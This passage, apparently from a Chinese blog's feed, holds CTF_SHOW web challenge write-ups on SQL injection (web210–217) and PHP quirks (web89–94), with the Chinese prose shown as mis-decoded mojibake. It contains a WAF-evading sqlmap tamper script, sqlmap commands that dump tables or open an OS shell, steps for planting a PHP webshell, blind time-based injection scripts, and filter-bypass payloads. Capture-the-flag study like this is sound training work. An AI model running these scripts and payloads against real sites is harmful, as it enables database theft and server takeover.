å¯†ç„¶åè¿›è¡Œåè½¬ï¼Œç„¶åå†è¿›è¡Œbase64åŠ å¯†ï¼Œæœ€åå†è¿›è¡Œåè½¬ï¼›</p><p>æ‰€ä»¥åªéœ€åè½¬å›å»å³å¯ï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python</span><span class="token triple-quoted-string string">"""Copyright (c) 2006-2020 sqlmap developers (http://sqlmap.org/)See the file 'LICENSE' for copying permission"""</span><span class="token keyword">from</span> lib<span class="token punctuation">.</span>core<span class="token punctuation">.</span>compat <span class="token keyword">import</span> <span class="token builtin">xrange</span><span class="token keyword">from</span> lib<span class="token punctuation">.</span>core<span class="token punctuation">.</span>enums <span class="token keyword">import</span> PRIORITY<span class="token keyword">import</span> base64__priority__ <span class="token operator">=</span> PRIORITY<span class="token punctuation">.</span>LOW<span class="token keyword">def</span> <span class="token function">dependencies</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">pass</span><span class="token keyword">def</span> <span class="token function">tamper</span><span class="token punctuation">(</span>payload<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""    Replaces space character (' ') with comments '/**/'    Tested against:        * Microsoft SQL Server 2005        * MySQL 4, 5.0 and 5.5        * Oracle 10g        * PostgreSQL 8.3, 8.4, 9.0    Notes:        * Useful to bypass weak and bespoke web application firewalls    >>> tamper('SELECT id FROM users')    'SELECT/**/id/**/FROM/**/users'    """</span>    retVal <span class="token operator">=</span> payload    <span class="token keyword">if</span> payload<span class="token punctuation">:</span>        retVal <span class="token operator">=</span> <span class="token string">""</span>        quote<span class="token punctuation">,</span> doublequote<span class="token punctuation">,</span> firstspace <span class="token operator">=</span> <span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token boolean">False</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">xrange</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> <span class="token keyword">not</span> firstspace<span class="token punctuation">:</span>                <span class="token keyword">if</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>isspace<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                    firstspace <span class="token operator">=</span> <span class="token boolean">True</span>                    retVal <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">0x9</span><span class="token punctuation">)</span>                    <span class="token keyword">continue</span>            <span class="token keyword">elif</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'\''</span><span class="token punctuation">:</span>                quote <span class="token operator">=</span> <span class="token keyword">not</span> quote            <span class="token keyword">elif</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'"'</span><span class="token punctuation">:</span>                doublequote <span class="token operator">=</span> <span class="token keyword">not</span> doublequote            <span class="token keyword">elif</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'='</span><span class="token punctuation">:</span>                retVal <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">0x9</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'like'</span> <span class="token operator">+</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">0x9</span><span class="token punctuation">)</span>                <span class="token keyword">continue</span>            <span class="token keyword">elif</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">" "</span> <span class="token keyword">and</span> <span class="token keyword">not</span> doublequote <span class="token keyword">and</span> <span class="token keyword">not</span> quote<span class="token punctuation">:</span>                retVal <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">0x9</span><span class="token punctuation">)</span>                <span class="token keyword">continue</span>            retVal <span class="token operator">+=</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span>    payload_ret <span class="token operator">=</span> retVal    retVal <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>payload_ret<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> retVal<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>payloadï¼š</p><pre class="line-numbers language-none"><code class="language-none">python2 sqlmap.py -u &quot;http:&#x2F;&#x2F;f37a365b-f382-478c-9d3b-1f19661809c6.challenge.ctf.show&#x2F;api&#x2F;index.php&quot; --data&#x3D;&quot;id&#x3D;1&quot; --method&#x3D;PUT --headers&#x3D;&quot;Content-Type: text&#x2F;plain&quot; --safe-url&#x3D;&quot;http:&#x2F;&#x2F;f37a365b-f382-478c-9d3b-1f19661809c6.challenge.ctf.show&#x2F;api&#x2F;getToken.php&quot; --safe-freq&#x3D;1 --tamper&#x3D;web210.py --referer &quot;http:&#x2F;&#x2F;f37a365b-f382-478c-9d3b-1f19661809c6.challenge.ctf.show&#x2F;sqlmap.php&quot; --dbms &quot;mysql&quot; --threads 3 ctfshow_flavi -C ctfshow_flagxx --dump<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æ‹¿åˆ°flag</p><h4 id="web211"><a href="#web211" class="headerlink" title="web211"></a>web211</h4><pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F;å¯¹æŸ¥è¯¢å­—ç¬¦è¿›è¡Œè§£å¯†  function decode($id)&#123;    return strrev(base64_decode(strrev(base64_decode($id))));  &#125;function waf($str)&#123;    return preg_match(&#39;&#x2F; &#x2F;&#39;, $str);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æœ¬é¢˜åªæ˜¯åœ¨210çš„åŸºç¡€ä¸Šå°†ç©ºæ ¼è¿‡æ»¤äº†ï¼Œä½†web210.pyæœ¬èº«å°±æ˜¯åœ¨å°†ç©ºæ ¼è¿‡æ»¤çš„è„šæœ¬çš„åŸºç¡€ä¸Šä¿®æ”¹çš„ï¼Œæ‰€ä»¥ç›´æ¥å¥—ç”¨å³å¯ï¼Œpayloadï¼š</p><pre class="line-numbers language-none"><code class="language-none">python2 sqlmap.py -u &quot;http:&#x2F;&#x2F;cb1b728a-dc92-47f9-b8ce-01dcc157a5b5.challenge.ctf.show&#x2F;api&#x2F;index.php&quot; --data&#x3D;&quot;id&#x3D;1&quot; --method&#x3D;PUT --headers&#x3D;&quot;Content-Type: text&#x2F;plain&quot; --safe-url&#x3D;&quot;http:&#x2F;&#x2F;cb1b728a-dc92-47f9-b8ce-01dcc157a5b5.challenge.ctf.show&#x2F;api&#x2F;getToken.php&quot; --safe-freq&#x3D;1 --tamper&#x3D;web210.py --referer &quot;http:&#x2F;&#x2F;cb1b728a-dc92-47f9-b8ce-01dcc157a5b5.challenge.ctf.show&#x2F;sqlmap.php&quot; -D ctfshow_web -T ctfshow_flavia --columns --dump<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="web212"><a href="#web212" class="headerlink" title="web212"></a>web212</h4><pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F;å¯¹æŸ¥è¯¢å­—ç¬¦è¿›è¡Œè§£å¯†  function decode($id)&#123;    return strrev(base64_decode(strrev(base64_decode($id))));  &#125;function waf($str)&#123;    return preg_match(&#39;&#x2F; |\*&#x2F;&#39;, $str);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç»§ç»­ä¸Šé¢˜çš„è„šæœ¬</p><pre class="line-numbers language-none"><code class="language-none">python2 sqlmap.py -u &quot;http:&#x2F;&#x2F;21a73396-75ff-4108-98ee-bd688b5f749a.challenge.ctf.show&#x2F;api&#x2F;index.php&quot; --data&#x3D;&quot;id&#x3D;1&quot; --method&#x3D;PUT --headers&#x3D;&quot;Content-Type: text&#x2F;plain&quot; --safe-url&#x3D;&quot;http:&#x2F;&#x2F;21a73396-75ff-4108-98ee-bd688b5f749a.challenge.ctf.show&#x2F;api&#x2F;getToken.php&quot; --safe-freq&#x3D;1 --tamper&#x3D;web210.py --referer &quot;http:&#x2F;&#x2F;21a73396-75ff-4108-98ee-bd688b5f749a.challenge.ctf.show&#x2F;sqlmap.php&quot; -D ctfshow_web --tables --columns --dump<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="web213"><a href="#web213" class="headerlink" title="web213"></a>web213</h4><pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F;å¯¹æŸ¥è¯¢å­—ç¬¦è¿›è¡Œè§£å¯†  function decode($id)&#123;    return strrev(base64_decode(strrev(base64_decode($id))));  &#125;function waf($str)&#123;    return preg_match(&#39;&#x2F; |\*&#x2F;&#39;, $str);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>é¢˜ç›®æç¤ºè¯´ç»ƒä¹ ä½¿ç”¨â€“os-shell ä¸€é”®getshell</p><p>çœ‹äº†å—ç¥ç»™çš„wpæ‰çŸ¥é“å…¶æœ¬è´¨æ˜¯ä¸Šä¼ ä¸¤ä¸ªæ–‡ä»¶ï¼Œä¸€ä¸ªæ˜¯å‘½ä»¤æ‰§è¡Œçš„æ–‡ä»¶ï¼Œå¦ä¸€ä¸ªæ˜¯å¯ä»¥è®©æˆ‘ä»¬æ–‡ä»¶ä¸Šä¼ çš„æ–‡ä»¶ï¼Œå…ˆå°è¯•ç”¨212çš„payloadï¼š</p><pre class="line-numbers language-none"><code class="language-none">python2 sqlmap.py -u &quot;http:&#x2F;&#x2F;ae89f0bb-77a1-4bc2-806b-ae2aa533ed48.challenge.ctf.show&#x2F;api&#x2F;index.php&quot; --data&#x3D;&quot;id&#x3D;1&quot; --method&#x3D;PUT --headers&#x3D;&quot;Content-Type: text&#x2F;plain&quot; --safe-url&#x3D;&quot;http:&#x2F;&#x2F;ae89f0bb-77a1-4bc2-806b-ae2aa533ed48.challenge.ctf.show&#x2F;api&#x2F;getToken.php&quot; --safe-freq&#x3D;1 --tamper&#x3D;web210.py --referer &quot;http:&#x2F;&#x2F;ae89f0bb-77a1-4bc2-806b-ae2aa533ed48.challenge.ctf.show&#x2F;sqlmap.php&quot; --threads&#x3D;3 --os-shell<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/images/web_213a.png"></p><p>å› ä¸ºphpæ˜¯é»˜è®¤çš„æ‰€æœ‰é€‰4</p><p><img src="/images/web_213b.png"></p><p>ç›®å½•å°±é€‰ç¬¬ä¸€ä¸ª</p><p><img src="/images/web_213c.png"></p><p>å‘ç°å¤šäº†ä¸¤ä¸ªæ–‡ä»¶ï¼Œç›´æ¥è®¿é—®ä»–ä»¬ï¼Œå‘ç°å…¶ä¸­ä¸€ä¸ªå¯ä»¥ä¸Šä¼ æ–‡ä»¶</p><p><img src="/images/web_213d.png"></p><p>æ¥ä¸‹æ¥åªéœ€è¦ä¸Šä¼ ä¸€å¥è¯æœ¨é©¬ï¼Œå†ç”¨èšå‰‘è¿æ¥å³å¯æ‹¿åˆ°flag</p><h4 id="web214"><a href="#web214" class="headerlink" title="web214"></a>web214</h4><p>sqlmapå°±æš‚åœä¸€æ®µè½äº†ï¼Œå¼€å§‹æ—¶é—´ç›²æ³¨äº†</p><p>æ¥åˆ°è¿™é¢˜ï¼Œå‘ç°æ‰¾ä¸åˆ°æ³¨å…¥ç‚¹ï¼Œå°±åªèƒ½é€šè¿‡bpå»æŸ¥çœ‹å¯¹åº”çš„æ•°æ®åŒ…äº†ï¼Œå‘ç°æ³¨å…¥ç‚¹åœ¨ä¸€ä¸ªæ•°æ®åŒ…ä¸­</p><p><img src="/images/web_214.png"></p><p>é‚£ä¹ˆåªéœ€è¦ä¿®æ”¹ä¹‹å‰190çš„è„šæœ¬å³å¯</p><pre class="line-numbers language-none"><code class="language-none">import requestsimport timeurl &#x3D; &quot;http:&#x2F;&#x2F;d3ccbff4-4f2f-47b1-b0f1-742b2540e14d.challenge.ctf.show&#x2F;api&#x2F;index.php&quot;dict &#x3D; &quot;1234567890qwer_,tyuiopasdfghjklzxcvbnm-&#123;&#125;&quot;flag &#x3D; &quot;&quot;for i in range(1,60):    max &#x3D; 127    min &#x3D; 32    while 1:        mid &#x3D; (max+min)&gt;&gt;1        if(min &#x3D;&#x3D; mid):            flag +&#x3D; chr(mid)            print(flag)            break        #payload &#x3D; &quot;if((ascii(substr((select database()),&#123;&#125;,1))&lt;&#123;&#125;),sleep(2),1)#&quot;.format(i,mid)        #ctfshow_web        #payload &#x3D; &quot;if((ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),&#123;&#125;,1))&lt;&#123;&#125;),sleep(2),1)#&quot;.format(i,mid)        #ctfshow_flagx        #payload &#x3D; &quot;if((ascii(substr((select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;ctfshow_flagx&#39;),&#123;&#125;,1))&lt;&#123;&#125;),sleep(2),1)#&quot;.format(i,mid)        #id,flaga        payload &#x3D; &quot;if((ascii(substr((select flaga from ctfshow_flagx),&#123;&#125;,1))&lt;&#123;&#125;),sleep(2),1)#&quot;.format(i,mid)        data &#x3D; &#123;            &quot;ip&quot;: payload,            &quot;debug&quot;: 1        &#125;        start &#x3D; time.time()        res &#x3D; requests.post(url &#x3D; url,data &#x3D;data)        end &#x3D; time.time()        sub &#x3D; end - start        if sub &gt;&#x3D; 2:            max &#x3D; mid        else:            min &#x3D; mid<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ‹¿åˆ°flag</p><h4 id="web215"><a href="#web215" class="headerlink" title="web215"></a>web215</h4><p>é¢˜ç›®è¯´ç”¨äº†å•å¼•å·ï¼Œé‚£ä¹ˆåªéœ€åœ¨ä¸Šä¸€é¢˜çš„è„šæœ¬ä¸ŠåŠ ä¸Šå•å¼•å·å’Œorå³å¯ï¼Œpayload</p><pre class="line-numbers language-none"><code class="language-none">import requestsimport timeurl &#x3D; &quot;http:&#x2F;&#x2F;ca82acbd-ba7b-4464-8cb4-a7f0f57d0662.challenge.ctf.show&#x2F;api&#x2F;index.php&quot;dict &#x3D; &quot;1234567890qwer_,tyuiopasdfghjklzxcvbnm-&#123;&#125;&quot;flag &#x3D; &quot;&quot;for i in range(1,60):    max &#x3D; 127    min &#x3D; 32    while 1:        mid &#x3D; (max+min)&gt;&gt;1        if(min &#x3D;&#x3D; mid):            flag +&#x3D; chr(mid)            print(flag)            break        #payload &#x3D; &quot;&#39; or if((ascii(substr((select database()),&#123;&#125;,1))&lt;&#123;&#125;),sleep(2),1)#&quot;.format(i,mid)        #ctfshow_web        #payload &#x3D; &quot;&#39; or if((ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),&#123;&#125;,1))&lt;&#123;&#125;),sleep(2),1)#&quot;.format(i,mid)        #ctfshow_flagx        #payload &#x3D; &quot;&#39; or if((ascii(substr((select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;ctfshow_flagx&#39;),&#123;&#125;,1))&lt;&#123;&#125;),sleep(2),1)#&quot;.format(i,mid)        #id,flaga        payload &#x3D; &quot;&#39; or if((ascii(substr((select flagaa from ctfshow_flagxc),&#123;&#125;,1))&lt;&#123;&#125;),sleep(2),1)#&quot;.format(i,mid)        data &#x3D; &#123;            &quot;ip&quot;: payload,            &quot;debug&quot;: 1        &#125;        start &#x3D; time.time()        res &#x3D; requests.post(url &#x3D; url,data &#x3D;data)        end &#x3D; time.time()        sub &#x3D; end - start        if sub &gt;&#x3D; 2:            max &#x3D; mid        else:            min &#x3D; mid<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="web216"><a href="#web216" class="headerlink" title="web216"></a>web216</h4><p>æŸ¥è¯¢è¯­å¥</p><pre class="line-numbers language-none"><code class="language-none">where id &#x3D; from_base64($id);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>é‚£ä¹ˆæˆ‘ä»¬åªéœ€è¦åœ¨215çš„åŸºç¡€ä¸Šé—­åˆæ‹¬å·å³å¯</p><pre class="line-numbers language-none"><code class="language-none">import requestsimport timeurl &#x3D; &quot;http:&#x2F;&#x2F;d26f1537-5119-4e2d-a45a-438fa182dba3.challenge.ctf.show&#x2F;api&#x2F;index.php&quot;dict &#x3D; &quot;1234567890qwer_,tyuiopasdfghjklzxcvbnm-&#123;&#125;&quot;flag &#x3D; &quot;&quot;for i in range(1,60):    max &#x3D; 127    min &#x3D; 32    while 1:        mid &#x3D; (max+min)&gt;&gt;1        if(min &#x3D;&#x3D; mid):            flag +&#x3D; chr(mid)            print(flag)            break        #payload &#x3D; &quot;&#39; or if((ascii(substr((select database()),&#123;&#125;,1))&lt;&#123;&#125;),sleep(2),1)#&quot;.format(i,mid)        #ctfshow_web        #payload &#x3D; &quot;&#39; or if((ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),&#123;&#125;,1))&lt;&#123;&#125;),sleep(2),1)#&quot;.format(i,mid)        #ctfshow_flagxcc        #payload &#x3D; &quot;&#39; or if((ascii(substr((select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;ctfshow_flagx&#39;),&#123;&#125;,1))&lt;&#123;&#125;),sleep(2),1)#&quot;.format(i,mid)        #id,flagaac        payload &#x3D; &quot;&#39;&#39;) or if((ascii(substr((select flagaac from ctfshow_flagxcc),&#123;&#125;,1))&lt;&#123;&#125;),sleep(3),1)#&quot;.format(i,mid)        data &#x3D; &#123;            &quot;ip&quot;: payload,            &quot;debug&quot;: 1        &#125;        start &#x3D; time.time()        res &#x3D; requests.post(url &#x3D; url,data &#x3D; data)        end &#x3D; time.time()        sub &#x3D; end - start        if sub &gt;&#x3D; 3:            max &#x3D; mid        else:            min &#x3D; mid<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="web217"><a href="#web217" class="headerlink" title="web217"></a>web217</h4><p>sqlæ³¨å…¥å…ˆæš‚å‘Šä¸€æ®µè½ï¼Œç­‰åé¢çš„åŸºç¡€åšå¾—å·®ä¸å¤šäº†ï¼Œå†å›æ¥æ¥ç€åš</p>]]></content>
      
      
      <categories>
          
          <category> ctf_show </category>
          
      </categories>
      
      
        <tags>
            
            <tag> webå…¥é—¨_sqlæ³¨å…¥ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF_SHOWä¹‹webå…¥é—¨PHPç‰¹æ€§éƒ¨åˆ†wp</title>
      <link href="/2022/03/06/jian-web2/"/>
      <url>/2022/03/06/jian-web2/</url>
      
        <content type="html"><![CDATA[<h3 id="PHPç‰¹æ€§"><a href="#PHPç‰¹æ€§" class="headerlink" title="PHPç‰¹æ€§"></a>PHPç‰¹æ€§</h3><h4 id="web89"><a href="#web89" class="headerlink" title="web89"></a>web89</h4><pre class="line-numbers language-plain" data-language="plain"><code class="language-plain">&lt;?phpinclude("flag.php");highlight_file(__FILE__);if(isset($_GET['num']))&#123;    $num = $_GET['num'];    if(preg_match("/[0-9]/", $num))&#123;        die("no no no!");    &#125;    if(intval($num))&#123;        echo $flag;    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>intval:ç”¨äºå–å˜é‡çš„æ•´æ•°å€¼ï¼ˆå‡½æ•°é€šè¿‡ä½¿ç”¨æŒ‡å®šçš„è¿›åˆ¶ base è½¬æ¢ï¼ˆé»˜è®¤æ˜¯åè¿›åˆ¶ï¼‰ï¼Œè¿”å›å˜é‡ var çš„ integer æ•°å€¼ã€‚intval() ä¸èƒ½ç”¨äº objectï¼Œå¦åˆ™ä¼šäº§ç”Ÿ E_NOTICE é”™è¯¯å¹¶è¿”å› 1ã€‚ï¼‰<br>preg_matchï¼šåŒ¹é…æ­£åˆ™è¡¨è¾¾å¼</p><p>ç¬¬ä¸€ä¸ª if åˆ¤æ–­æ˜¯å¦æœ‰ GET å‹ num å˜é‡ä¼ è¿›æ¥ï¼Œç¬¬äºŒä¸ª if æ˜¯åˆ¤æ–­å˜é‡ num ä¸­æ˜¯å¦æœ‰æ•°å­— 0-9ï¼Œå¦‚æœæœ‰ï¼Œåˆ™ç¨‹åºç»“æŸå¹¶è¾“å‡ºâ€œno no noâ€ï¼Œç¬¬ä¸‰ if æ˜¯å–å˜é‡ num çš„æ•´æ•°å€¼ï¼Œè€Œ intval å‡½æ•°ç”¨äº object æ—¶ä¼šå‘ç”Ÿé”™è¯¯å¹¶è¿”å› 1ï¼Œæ‰€ä»¥ payloadï¼š</p><pre class="line-numbers language-plain" data-language="plain"><code class="language-plain">?num[]=1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æˆåŠŸå–å¾— flagï¼šctfshow{074ac141-d164-4427-a67f-37a0347de8a7}</p><h4 id="web90"><a href="#web90" class="headerlink" title="web90"></a>web90</h4><pre class="line-numbers language-plain" data-language="plain"><code class="language-plain">&lt;?phpinclude("flag.php");highlight_file(__FILE__);if(isset($_GET['num']))&#123;    $num = $_GET['num'];    if($num==="4476")&#123;        die("no no no!");    &#125;    if(intval($num,0)===4476)&#123;        echo $flag;    &#125;else&#123;        echo intval($num,0);    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>intval($var,$base):</li><li>$varï¼šè¦è½¬æ¢æˆ integer çš„æ•°é‡å€¼ã€‚</li><li>$baseï¼šè½¬åŒ–æ‰€ä½¿ç”¨çš„è¿›åˆ¶ã€‚å¦‚æœ base æ˜¯ 0ï¼Œé€šè¿‡æ£€æµ‹ var çš„æ ¼å¼æ¥å†³å®šä½¿ç”¨çš„è¿›åˆ¶ï¼š<br>å°† 4476 è½¬æ¢ä¸º 16 è¿›åˆ¶åå†ä¼ è¾“ï¼Œpayload ä¸ºï¼š</li></ul><pre class="line-numbers language-plain" data-language="plain"><code class="language-plain">?num=0x117c<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æˆåŠŸè·å¾— flagï¼šctfshow{a28ff94c-052b-4c4b-95ca-2dfe90e83d88}</p><h4 id="web91"><a href="#web91" class="headerlink" title="web91"></a>web91</h4><pre class="line-numbers language-plain" data-language="plain"><code class="language-plain">&lt;?phpshow_source(__FILE__);include('flag.php');$a=$_GET['cmd'];if(preg_match('/^php$/im', $a))&#123;    if(preg_match('/^php$/i', $a))&#123;        echo 'hacker';    &#125;    else&#123;        echo $flag;    &#125;&#125;else&#123;    echo 'nonononono';&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>/i è¡¨ç¤ºåŒ¹é…å¤§å°å†™<br>å­—ç¬¦ ^ å’Œ $ åŒæ—¶ä½¿ç”¨æ—¶ï¼Œè¡¨ç¤ºç²¾ç¡®åŒ¹é…ï¼Œéœ€è¦åŒ¹é…ä»¥ php å¼€å¤´å’Œä»¥ php ç»“å°¾</p><p>/m å¤šè¡ŒåŒ¹é… è‹¥å­˜åœ¨æ¢è¡Œ\n å¹¶ä¸”æœ‰å¼€å§‹^æˆ–ç»“æŸ$ç¬¦çš„æƒ…å†µä¸‹ï¼Œå°†ä»¥æ¢è¡Œä¸ºåˆ†éš”ç¬¦ï¼Œé€è¡Œè¿›è¡ŒåŒ¹é…ï¼Œä½†æ˜¯å½“å‡ºç°æ¢è¡Œç¬¦Â <code>%0``a</code> çš„æ—¶å€™ï¼Œ$cmd çš„å€¼ä¼šè¢«å½“åšä¸¤è¡Œå¤„ç†ï¼Œè€Œæ­¤æ—¶ç¬¬äºŒä¸ª if æ­£åˆ™åŒ¹é…ä¸ç¬¦åˆä»¥ php å¼€å¤´å’Œä»¥ php ç»“å°¾ </p><p>æ‰€ä»¥ payload å¯ä»¥ä¸ºï¼š</p><pre class="line-numbers language-plain" data-language="plain"><code class="language-plain">?cmd=%0aphp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ç–‘ç‚¹ï¼Œæ²¡æƒ³æ˜ç™½ä¸ºä»€ä¹ˆ?cmd=php%0a%a ä¹Ÿå¯ä»¥ã€‚<br>å…ˆæ¥ç€åš</p><p>flag ä¸ºï¼šctfshow{1b0b9324-9d17-42b9-a2fe-bbcf4e903d7c}</p><h4 id="web92"><a href="#web92" class="headerlink" title="web92"></a>web92</h4><pre class="line-numbers language-plain" data-language="plain"><code class="language-plain">&lt;?phpinclude("flag.php");highlight_file(__FILE__);if(isset($_GET['num']))&#123;    $num = $_GET['num'];    if($num==4476)&#123;        die("no no no!");    &#125;    if(intval($num,0)==4476)&#123;        echo $flag;    &#125;else&#123;        echo intval($num,0);    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å’Œ 90 é¢˜ç›¸ä¼¼ï¼Œä½†æ¢æˆäº†å¼±ç±»å‹æ¯”è¾ƒï¼Œå¯ç»§ç»­ä½¿ç”¨ 90 é¢˜çš„ payloadï¼š</p><pre class="line-numbers language-plain" data-language="plain"><code class="language-plain">?num=0x117c<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æ‹¿åˆ° flagï¼šctfshow{58f0fb9a-f40a-4c11-98db-82f162926f3b}</p><h4 id="web93"><a href="#web93" class="headerlink" title="web93"></a>web93</h4><pre class="line-numbers language-plain" data-language="plain"><code class="language-plain">&lt;?phpinclude("flag.php");highlight_file(__FILE__);if(isset($_GET['num']))&#123;    $num = $_GET['num'];    if($num==4476)&#123;        die("no no no!");    &#125;    if(preg_match("/[a-z]/i", $num))&#123;        die("no no no!");    &#125;    if(intval($num,0)==4476)&#123;        echo $flag;    &#125;else&#123;        echo intval($num,0);    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¿™ä¸€æ¬¡å¤šäº†ä¸€ä¸ªå¯¹å­—æ¯è¿‡æ»¤ï¼Œå°±ä¸èƒ½å†ç”¨ 16 è¿›åˆ¶äº†ï¼Œå¯ä»¥ä½¿ç”¨ 8 è¿›åˆ¶è¿›è¡Œç»•è¿‡<br>payload ä¸ºï¼š</p><pre class="line-numbers language-plain" data-language="plain"><code class="language-plain">?num=010574<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æ‹¿åˆ° flagï¼šctfshow{8ee86a68-94e7-43db-9f2e-01e5a74bf5c1}</p><h4 id="web94"><a href="#web94" class="headerlink" title="web94"></a>web94</h4><pre class="line-numbers language-plain" data-language="plain"><code class="language-plain">&lt;?phpinclude("flag.php");highlight_file(__FILE__);if(isset($_GET['num']))&#123;    $num = $_GET['num'];    if($num==="4476")&#123;        die("no no no!");    &#125;    if(preg_match("/[a-z]/i", $num))&#123;        die("no no no!");    &#125;    if(!strpos($num, "0"))&#123;        die("no no no!");    &#125;    if(intval($num,0)===4476)&#123;        echo $flag;    &#125;&#125;<span aria-hidden="true" 